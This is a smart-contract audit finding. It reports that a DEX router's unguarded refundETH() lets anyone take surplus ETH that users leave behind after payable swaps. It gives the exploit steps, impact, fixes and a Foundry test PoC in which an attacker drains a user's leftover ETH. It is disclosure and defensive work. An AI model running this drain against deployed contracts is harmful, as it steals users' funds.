Audit Report

## Title
Unguarded `refundETH()` Allows Any Caller to Drain Residual ETH Left by Prior Swaps — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary
`refundETH()` unconditionally transfers the router's entire native ETH balance to `msg.sender` with no access control. Every swap entry-point (`exactInputSingle`, `exactOutputSingle`, `exactInput`, `exactOutput`) is `payable`, and the `pay()` helper wraps only the exact required ETH amount, leaving any surplus in the contract. A user who sends excess ETH without bundling `refundETH` in the same `multicall` permanently exposes that surplus to any subsequent caller.

## Finding Description
**Root cause — `refundETH()` has no access control.** [1](#0-0) 
The function reads `address(this).balance` and calls `_transferETH(msg.sender, balance)` with no check that `msg.sender` is the original ETH depositor.

**ETH enters via payable swap calls, bypassing `receive()`.** [2](#0-1) 
The `receive()` guard only rejects plain ETH transfers; it does not apply to ETH sent alongside a payable function call such as `exactInputSingle{value: 2 ether}(...)`.

**`pay()` wraps only the exact required amount, leaving the surplus.** [3](#0-2) 
When `token == WETH` and `nativeBalance >= value`, exactly `value` wei is deposited as WETH and forwarded to the pool. The remainder (`nativeBalance - value`) stays as raw ETH in the router after the transaction.

**Swap entry-points perform no post-swap ETH refund.** [4](#0-3) 
`exactInputSingle` (and the other three entry-points) returns after `_clearExpectedCallbackPool()` with no automatic refund of excess ETH. The same pattern holds for `exactOutputSingle`, `exactInput`, and `exactOutput`.

**Exploit flow:**
1. UserA calls `exactInputSingle{value: 2 ether}` with `amountIn = 1000` and `tokenIn = WETH`.
2. Inside the swap callback, `pay()` wraps exactly 1000 wei as WETH and sends it to the pool; ~2 ether − 1000 wei remains in the router.
3. `exactInputSingle` returns with no refund.
4. Attacker calls `router.refundETH()` in any subsequent transaction and receives the full residual balance.

No front-running is required; the attacker can act in any later block.

## Impact Explanation
Direct loss of user principal. Any ETH surplus left in the router after a swap is immediately claimable by any EOA or contract via a single permissionless `refundETH()` call. The victim loses the full surplus ETH they sent. This satisfies the "Critical/High/Medium direct loss of user principal" impact gate.

## Likelihood Explanation
Medium. The trigger requires a user to send excess ETH to a payable swap function without appending `refundETH` to the same `multicall`. This is a realistic mistake: users may call `exactInputSingle` or `exactOutputSingle` directly with a round-number ETH value, or may construct a multicall that omits the refund step. The exploit itself is trivial — a single permissionless call with no special capability required.

## Recommendation
Two complementary mitigations:

1. **Track ETH ownership in transient storage.** When a payable swap function is entered, record `msg.sender` as the ETH depositor (e.g., in a transient storage slot). In `refundETH()`, require `msg.sender == storedDepositor`, or unconditionally refund to the stored depositor regardless of caller.

2. **Auto-refund excess ETH at the end of each top-level swap.** After `_clearExpectedCallbackPool()`, compute `address(this).balance` and, if non-zero, transfer it back to `msg.sender` — mirroring how Uniswap v3's `SwapRouter02` handles this pattern.

## Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import "forge-std/Test.sol";
import {MetricOmmSimpleRouter} from "metric-periphery/contracts/MetricOmmSimpleRouter.sol";
import {IMetricOmmSimpleRouter} from "metric-periphery/contracts/interfaces/IMetricOmmSimpleRouter.sol";

contract RefundETHTheftTest is Test {
    function test_attacker_steals_residual_eth() public {
        address userA    = makeAddr("userA");
        address attacker = makeAddr("attacker");
        vm.deal(userA, 2 ether);

        // UserA calls exactInputSingle directly (no multicall, no refundETH)
        vm.prank(userA);
        router.exactInputSingle{value: 2 ether}(
            IMetricOmmSimpleRouter.ExactInputSingleParams({
                pool:             address(pool),
                tokenIn:          address(weth),
                tokenOut:         address(token1),
                zeroForOne:       true,
                amountIn:         1000,       // only 1000 wei consumed by pay()
                amountOutMinimum: 0,
                recipient:        userA,
                deadline:         block.timestamp + 1,
                priceLimitX64:    0,
                extensionData:    ""
            })
        );

        // Router holds ~2 ether - 1000 wei of residual ETH
        assertGt(address(router).balance, 0, "residual ETH in router");

        // Attacker drains it with a single permissionless call
        vm.prank(attacker);
        router.refundETH();

        assertEq(address(router).balance, 0, "router drained");
        assertGt(attacker.balance,        0, "attacker received userA's ETH");
        assertEq(userA.balance,           0, "userA lost surplus ETH");
    }
}
```
